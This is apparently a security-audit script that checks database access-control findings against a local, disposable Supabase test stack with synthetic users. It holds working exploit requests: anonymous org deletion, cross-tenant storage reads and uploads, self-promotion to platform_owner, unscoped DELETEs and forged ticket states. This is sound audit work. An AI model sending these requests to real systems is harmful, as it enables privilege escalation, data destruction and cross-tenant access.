// CKDesk audit — dynamic verification of the database findings DB-01..DB-09 against the DISPOSABLE audit stack (127.0.0.1:55421) with synthetic users.
// Run only through audit-2026-10/guard/run.ps1 (isolation gate + egress guard).  Each probe prints EXPLOITABLE / BLOCKED / INFO and the raw evidence.
import fs from 'node:fs'
import path from 'node:path'

const URL_ = process.env.NEXT_PUBLIC_SUPABASE_URL
const ANON = process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY
const SERVICE = process.env.SUPABASE_SERVICE_ROLE_KEY
if (!/^http:\/\/127\.0\.0\.1:554\d\d$/.test(URL_ || '')) throw new Error('refusing to run: not the audit stack: ' + URL_)
const ORG_A = '00000000-0000-0000-0000-000000000001'
const PW = 'Audit-Pw-1!'
const results = []
const rec = (id, verdict, what, evidence) => { results.push({ id, verdict, what, evidence }); console.log(`${verdict.padEnd(11)} ${id}  ${what}\n            ${typeof evidence === 'string' ? evidence : JSON.stringify(evidence)}`) }

async function http(method, p, { token, key = ANON, body, headers = {} } = {}) {
  const r = await fetch(URL_ + p, { method, headers: { apikey: key, Authorization: `Bearer ${token ?? key}`, 'Content-Type': 'application/json', ...headers }, body: body === undefined ? undefined : typeof body === 'string' ? body : JSON.stringify(body) })
  const text = await r.text(); let json; try { json = JSON.parse(text) } catch { json = text }
  return { status: r.status, json }
}
const rest = (m, p, o) => http(m, '/rest/v1' + p, o)
const svc = (m, p, body, headers) => rest(m, p, { key: SERVICE, token: SERVICE, body, headers })
async function login(email) {
  const r = await http('POST', '/auth/v1/token?grant_type=password', { body: { email, password: PW } })
  if (!r.json.access_token) throw new Error('login failed ' + email + ' ' + JSON.stringify(r.json).slice(0, 120))
  return { token: r.json.access_token, id: r.json.user.id }
}
const short = (x, n = 160) => JSON.stringify(x).slice(0, n)

const admin = await login('admin1@audit.test'), manager = await login('manager1@audit.test'), agent = await login('agent1@audit.test'), staff = await login('staff1@audit.test'), staff2 = await login('staff2@audit.test')

// a second tenant, created with the service role, so cross-tenant effects are observable
const ORG_B = (await svc('POST', '/organizations', { name: 'AUDIT Tenant B', slug: 'audit-tenant-b', status: 'active', seat_limit: 10 }, { Prefer: 'return=representation' })).json[0]?.id
console.log('tenant B =', ORG_B)

// ── DB-01 owner_delete_org reachable by anon -------------------------------------------------
{
  const ghost = await http('POST', '/rest/v1/rpc/owner_delete_org', { body: { p_org_id: '11111111-1111-1111-1111-111111111111' } })
  rec('DB-01a', ghost.status === 200 ? 'EXPLOITABLE' : 'BLOCKED', 'anon calls owner_delete_org (non-existent org)  — function executes without any identity', short(ghost))
  const tmp = (await svc('POST', '/organizations', { name: 'AUDIT Throwaway', slug: 'audit-throwaway', status: 'active', seat_limit: 1 }, { Prefer: 'return=representation' })).json[0]?.id
  const real = await http('POST', '/rest/v1/rpc/owner_delete_org', { body: { p_org_id: tmp } })
  const still = await svc('GET', `/organizations?id=eq.${tmp}&select=id`)
  rec('DB-01b', still.json.length === 0 ? 'EXPLOITABLE' : 'BLOCKED', 'anon calls owner_delete_org on an existing throwaway org', `${short(real)} | org still exists: ${still.json.length === 1}`)
  const asUser = await http('POST', '/rest/v1/rpc/owner_delete_org', { token: staff.token, body: { p_org_id: tmp } })
  rec('DB-01c', asUser.status === 200 ? 'EXPLOITABLE' : 'BLOCKED', 'plain role=user calls owner_delete_org', short(asUser))
  await svc('DELETE', `/organizations?id=eq.${tmp}`)
}

// ── DB-02 storage: any authenticated user can read any request attachment --------------------
{
  const reqRow = (await svc('GET', '/requests?select=id&limit=1')).json[0]
  const objPath = `${reqRow.id}/audit-secret-${Date.now()}.txt`
  const up = await http('POST', `/storage/v1/object/request-attachments/${objPath}`, { key: SERVICE, token: SERVICE, body: 'INTERNAL-ONLY CONTENT (synthetic)', headers: { 'Content-Type': 'text/plain', 'x-upsert': 'true' } })
  const dl = await fetch(`${URL_}/storage/v1/object/authenticated/request-attachments/${objPath}`, { headers: { apikey: ANON, Authorization: `Bearer ${staff2.token}` } })
  const body = await dl.text()
  rec('DB-02a', dl.status === 200 && body.includes('INTERNAL-ONLY') ? 'EXPLOITABLE' : 'BLOCKED', 'unrelated requester (staff2) downloads another request\'s attachment straight from Storage', `upload ${up.status}; download ${dl.status} ${body.slice(0, 40)}`)
  const ls = await http('POST', '/storage/v1/object/list/request-attachments', { token: staff2.token, body: { prefix: '', limit: 5 } })
  rec('DB-02b', Array.isArray(ls.json) && ls.json.length > 0 ? 'EXPLOITABLE' : 'BLOCKED', 'unrelated requester lists the attachment bucket', short(ls.json?.map?.((o) => o.name) ?? ls.json))
  const upl = await http('POST', `/storage/v1/object/request-attachments/${reqRow.id}/staff-planted.txt`, { token: staff2.token, body: 'planted', headers: { 'Content-Type': 'text/plain' } })
  rec('DB-02c', upl.status === 200 ? 'EXPLOITABLE' : 'BLOCKED', 'unrelated requester uploads a file into another request\'s folder', short(upl))
  await http('DELETE', `/storage/v1/object/request-attachments`, { key: SERVICE, token: SERVICE, body: { prefixes: [objPath, `${reqRow.id}/staff-planted.txt`] } })
}

// ── DB-03 profiles self-update ----------------------------------------------------------------
{
  const me = await rest('PATCH', `/profiles?id=eq.${agent.id}`, { token: agent.token, body: { org_id: ORG_B }, headers: { Prefer: 'return=representation' } })
  const nowOrg = (await svc('GET', `/profiles?id=eq.${agent.id}&select=org_id`)).json[0]?.org_id
  rec('DB-03a', nowOrg === ORG_B ? 'EXPLOITABLE' : 'BLOCKED', 'technician moves their own profile into another tenant (org_id)', `${me.status} org_id now ${nowOrg === ORG_B ? 'tenant B' : nowOrg}`)
  await svc('PATCH', `/profiles?id=eq.${agent.id}`, { org_id: ORG_A })

  const esc = await rest('PATCH', `/profiles?id=eq.${admin.id}`, { token: admin.token, body: { role: 'platform_owner' }, headers: { Prefer: 'return=representation' } })
  const role = (await svc('GET', `/profiles?id=eq.${admin.id}&select=role`)).json[0]?.role
  rec('DB-03b', role === 'platform_owner' ? 'EXPLOITABLE' : 'BLOCKED', 'admin promotes themselves to platform_owner through PostgREST', `${esc.status} role now ${role}`)
  await svc('PATCH', `/profiles?id=eq.${admin.id}`, { role: 'admin' })

  const mgr = await rest('PATCH', `/profiles?id=eq.${manager.id}`, { token: manager.token, body: { must_reset_password: false, employee_id: 'FORGED', manager_id: admin.id }, headers: { Prefer: 'return=representation' } })
  const row = (await svc('GET', `/profiles?id=eq.${manager.id}&select=employee_id,manager_id`)).json[0]
  rec('DB-03c', row?.employee_id === 'FORGED' ? 'EXPLOITABLE' : 'BLOCKED', 'manager rewrites own employee_id / manager_id / must_reset_password', `${mgr.status} ${short(row)}`)
  await svc('PATCH', `/profiles?id=eq.${manager.id}`, { employee_id: null, manager_id: null })
}

// ── DB-09 deactivated user keeps working ------------------------------------------------------
{
  await svc('PATCH', `/profiles?id=eq.${staff2.id}`, { is_active: false })
  const r = await rest('GET', '/requests?select=id&limit=3', { token: staff2.token })
  rec('DB-09', Array.isArray(r.json) && r.json.length > 0 ? 'EXPLOITABLE' : 'INFO', 'a user flagged is_active=false still reads tickets with the existing token', `${r.status} rows=${Array.isArray(r.json) ? r.json.length : short(r.json)}`)
  const re = await rest('PATCH', `/profiles?id=eq.${staff2.id}`, { token: staff2.token, body: { is_active: true }, headers: { Prefer: 'return=representation' } })
  rec('DB-09b', re.status < 300 ? 'EXPLOITABLE' : 'BLOCKED', 'the deactivated user re-activates themselves', short(re))
  await svc('PATCH', `/profiles?id=eq.${staff2.id}`, { is_active: true })
}

// ── DB-04 global config tables --------------------------------------------------------------------------
{
  const read = await rest('GET', '/sla_escalation_rules?select=id&limit=2')
  rec('DB-04a', Array.isArray(read.json) && read.json.length ? 'EXPLOITABLE' : 'BLOCKED', 'anonymous (anon key only) reads SLA escalation rules', short(read.json))
  const before = (await svc('GET', '/business_hours?select=id,is_active&day_of_week=eq.1')).json[0]
  const w = await rest('PATCH', '/business_hours?day_of_week=eq.1', { token: manager.token, body: { is_active: !before.is_active }, headers: { Prefer: 'return=representation' } })
  const after = (await svc('GET', '/business_hours?select=is_active&day_of_week=eq.1')).json[0]
  rec('DB-04b', after.is_active !== before.is_active ? 'EXPLOITABLE' : 'BLOCKED', 'a manager changes the (global, all-tenant) business hours directly', `${w.status} is_active ${before.is_active} -> ${after.is_active}`)
  await svc('PATCH', '/business_hours?day_of_week=eq.1', { is_active: before.is_active })
  const s = await rest('PATCH', '/app_settings?key=eq.auto_close_days', { token: admin.token, body: { value: '1' }, headers: { Prefer: 'return=representation' } })
  rec('DB-04c', s.status < 300 && Array.isArray(s.json) && s.json.length ? 'EXPLOITABLE' : 'BLOCKED', 'admin of any tenant edits the global app_settings row', short(s))
  await svc('PATCH', '/app_settings?key=eq.auto_close_days', { value: '7' })
}

// ── DB-05 unscoped DELETE on tasks of another tenant ------------------------------------------------------
{
  const bUser = (await http('POST', '/auth/v1/admin/users', { key: SERVICE, token: SERVICE, body: { email: `tenantb-${Date.now()}@audit.test`, password: PW, email_confirm: true, user_metadata: { full_name: 'Tenant B user' } } })).json
  await svc('PATCH', `/profiles?id=eq.${bUser.id}`, { org_id: ORG_B, role: 'manager' })
  const t = await svc('POST', '/tasks', { title: 'tenant-B task (synthetic)', created_by: bUser.id, org_id: ORG_B, task_type: 'personal' }, { Prefer: 'return=representation' })
  const tid = Array.isArray(t.json) ? t.json[0]?.id : null
  const del = await rest('DELETE', '/tasks', { token: manager.token, headers: { Prefer: 'return=representation' } })
  const left = (await svc('GET', `/tasks?id=eq.${tid}&select=id`)).json.length
  rec('DB-05', tid && left === 0 ? 'EXPLOITABLE' : 'BLOCKED', 'manager of tenant A sends an UNFILTERED DELETE /tasks — does tenant B\'s task survive?', `create ${t.status}; delete ${del.status} ${short(del.json, 100)}; tenant-B task survives: ${left === 1}`)
  await svc('DELETE', `/tasks?id=eq.${tid}`); await http('DELETE', `/auth/v1/admin/users/${bUser.id}`, { key: SERVICE, token: SERVICE })
}

// ── DB-06 SECURITY DEFINER functions executable by anon --------------------------------------------------------
{
  const a = await http('POST', '/rest/v1/rpc/generate_request_no', { body: {} })
  const b = await http('POST', '/rest/v1/rpc/generate_request_no', { body: {} })
  rec('DB-06a', a.status === 200 && b.status === 200 ? 'EXPLOITABLE' : 'BLOCKED', 'anon burns ticket numbers via generate_request_no()', `${short(a.json)} then ${short(b.json)}`)
  const c = await http('POST', '/rest/v1/rpc/seed_default_sla_config', { body: { p_org_id: ORG_B } })
  rec('DB-06b', c.status < 300 ? 'EXPLOITABLE' : 'BLOCKED', 'anon runs seed_default_sla_config(org)', short(c))
}

// ── DB-07 forged lifecycle / SLA / ticket number ------------------------------------------------------------------
{
  const svcRow = (await svc('GET', '/services?select=id,team_id&limit=1')).json[0]
  const ins = await rest('POST', '/requests', { token: staff.token, headers: { Prefer: 'return=representation' }, body: { title: 'forged', requester_id: staff.id, org_id: ORG_A, service_id: svcRow.id, team_id: svcRow.team_id, status: 'closed', resolved_at: new Date().toISOString(), closed_at: new Date().toISOString(), resolution_due_at: '2099-01-01T00:00:00Z', priority: 'urgent' } })
  const row = Array.isArray(ins.json) ? ins.json[0] : null
  rec('DB-07a', row && row.status === 'closed' ? 'EXPLOITABLE' : 'BLOCKED', 'a requester inserts a ticket directly as status=closed with a 2099 SLA deadline', `${ins.status} ${row ? short({ status: row.status, due: row.resolution_due_at, no: row.request_no }) : short(ins.json)}`)
  if (row) {
    const first = (await svc('GET', '/requests?select=id,request_no&order=created_at.asc&limit=1')).json[0]
    const up = await rest('PATCH', `/requests?id=eq.${row.id}`, { token: agent.token, body: { request_no: 'CKSD-000001' }, headers: { Prefer: 'return=representation' } })
    rec('DB-07b', up.status < 300 && Array.isArray(up.json) && up.json[0]?.request_no === 'CKSD-000001' ? 'EXPLOITABLE' : 'BLOCKED', 'a technician rewrites a ticket number', short(up.json?.[0]?.request_no ?? up.json))
    await svc('DELETE', `/requests?id=eq.${row.id}`)
  }
}

await svc('DELETE', `/organizations?id=eq.${ORG_B}`)
const out = path.resolve(import.meta.dirname, '..', 'evidence', 'db-dynamic-verification.json')
fs.writeFileSync(out, JSON.stringify({ at: new Date().toISOString(), stack: URL_, results }, null, 1))
const n = (v) => results.filter((r) => r.verdict === v).length
console.log(`\nEXPLOITABLE ${n('EXPLOITABLE')}  BLOCKED ${n('BLOCKED')}  INFO ${n('INFO')}  -> ${out}`)
